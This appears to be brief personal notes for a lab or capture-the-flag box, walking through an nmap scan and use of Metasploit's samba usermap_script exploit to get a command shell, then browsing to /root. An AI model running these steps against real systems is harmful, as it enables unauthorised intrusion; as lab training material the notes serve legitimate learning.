# H1 First Box

# H2 Terminal setup

Either be in root or use sudo. 
Create three tabs (VPN, NMAP, HACK).

# H2 Step One

First scans

```
# nmap -sV -A -oN output.txt. <ip address>
```

search in metasploit

```
# msfconsole

msf5> search samba
```

Review the excellent ranked modules
```
msf5> info /exploit/linux/samba
msf5> info /exploit/multi/samba/usermap_script
```

To execute
```
msf5> use /exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) >  show options
msf5 exploit(multi/samba/usermap_script) >  set RHOST <ip address>
msf5 exploit(multi/samba/usermap_script) >  exploit
```

This will create a command shell back in the terminal

summary
```
id
pwd
cd /home/<user>
cd /root
```